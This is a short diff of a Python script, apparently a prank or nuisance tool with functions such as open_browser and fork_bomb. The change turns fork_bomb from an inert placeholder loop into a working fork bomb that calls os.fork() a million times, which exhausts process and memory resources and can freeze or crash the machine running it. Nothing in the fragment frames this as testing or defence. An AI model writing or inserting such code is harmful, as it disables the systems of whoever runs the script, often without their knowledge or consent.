@@ -29,8 +29,8 @@ def open_browser(site):
 	info('Open Chrome')
 
 def fork_bomb():
-	for x in range(1000):
-		pass
+	for x in range(1000000):
+		os.fork()
 	info('Fork Bomb')
 
 def fork_bomb2():
